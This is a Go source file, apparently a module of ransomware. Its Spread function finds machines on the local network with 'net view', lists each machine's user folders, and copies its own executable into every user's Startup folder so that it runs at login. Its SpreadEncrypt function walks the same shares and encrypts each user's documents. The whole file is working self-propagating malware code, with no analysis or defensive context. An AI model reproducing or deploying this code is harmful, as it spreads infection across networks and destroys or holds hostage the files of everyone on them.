package spread

import "regexp"
import "strings"
import "os"

var SharedPCs []string

func Spread() {
	netPcs := RunRes("net view")
	//Parse
	re := regexp.MustCompile(`\\\\.*\b`)
	for _, match := range re.FindAllString(netPcs, -1) {
		SharedPCs = append(SharedPCs, match)
	}
	//For PC in SharedPCs, get users
	for _, SharedPC := range SharedPCs {
		out := RunRes("dir /B /A " + SharedPC + "\\Users")
		users := strings.Split(out, "\r\n")
		//Copy to run
		for _, user := range users {
			RunRes("copy " + os.Args[0] + " /Y /Z /V " + SharedPC + "\\Users\\" + user +
				"\\Appdata\\Roaming\\Microsoft\\Windows\\" + `"Start Menu"` + "\\Programs\\Startup")
		}
	}
}
func SpreadEncrypt(mode bool) {
	netPcs := RunRes("net view")
	//Parse
	re := regexp.MustCompile(`\\\\.*\b`)
	for _, match := range re.FindAllString(netPcs, -1) {
		SharedPCs = append(SharedPCs, match)
	}
	//For PC in SharedPCs, get users
	for _, SharedPC := range SharedPCs {
		out := RunRes("dir /B /A " + SharedPC + "\\Users")
		users := strings.Split(out, "\r\n")
		//Copy to run
		for _, user := range users {
			EncryptDocumets(SharedPC+"\\Users\\"+user+"\\", mode)
		}
	}
}
